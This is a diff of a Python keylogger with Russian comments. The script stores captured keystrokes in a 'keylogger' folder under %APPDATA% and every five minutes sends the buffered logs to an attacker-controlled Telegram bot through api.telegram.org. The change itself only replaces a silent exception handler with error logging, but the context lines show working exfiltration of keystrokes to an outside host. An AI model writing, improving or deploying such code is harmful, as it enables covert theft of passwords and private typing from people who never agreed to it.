@@ -8,11 +8,13 @@ import requests
 import threading
 import time
 import winreg
+import logging
 
 # ─── Фиксированная папка в %APPDATA% ───────────────────────────────
 appdata = os.getenv('APPDATA')
 base_dir = os.path.join(appdata, 'keylogger')
 os.makedirs(base_dir, exist_ok=True)
+log = logging.getLogger("keylogger")
 
 # пути к файлам внутри фиксированной папки
 LOG_FILE = os.path.join(base_dir, 'keylogs.txt')
@@ -83,8 +85,8 @@ class KeyLogger:
                         f"https://api.telegram.org/bot{self.telegram_token}/sendMessage",
                         data={"chat_id": self.chat_id, "text": payload}
                     )
-                except Exception:
-                    pass
+                except Exception as e:
+                    log.exception("Не удалось отправить логи: %s", e)
                 self.log_buffer.clear()
             time.sleep(300)
 
